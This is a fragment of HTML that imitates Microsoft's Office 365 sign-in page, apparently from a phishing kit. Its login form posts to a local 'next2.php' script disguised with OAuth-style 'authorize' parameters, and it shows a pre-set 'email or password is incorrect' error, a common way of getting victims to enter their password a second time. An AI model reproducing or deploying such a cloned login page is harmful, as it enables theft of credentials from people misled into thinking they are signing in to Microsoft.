...
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
        ...
        <form name="f1" id="i0281" class="form" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="next2.php?authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dMkI4qQBYEQQ-u8ByVeYnS93HqSpWD4ssnyM2pBs-8f-9kWopUaq7taUz_IuiWaFAjxnZnCfkV5hNH1PsVz-_WXPEYTAGBfdkeNV_LDAigb-sG0SkoqsW1orJAXKeFI_O&nonce=636673178890036399.YzU3MWNlYWUtMjQ0Yy00M2E1LWE1M2UtZTJlOWE1ZDJlYzQxYjY0M2Y5YTUtN2Q2YS00YjMzLWI5ZWMtYTZhZjNlN2ZiYzlj&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US">
            <div class="outer">
                <div class="middle">
                    <!-- /ko -->
                    <div class="inner">
                                ...
                                <div data-viewid="2" data-dynamicbranding="true">
                                    ...
                                    <div class="row">
                                        <div class="form-group col-md-24">
                                            <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error --> <div id="passwordError" class="alert alert-error" style="display: true;">Your email or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="#">reset it now.</a></div></div>
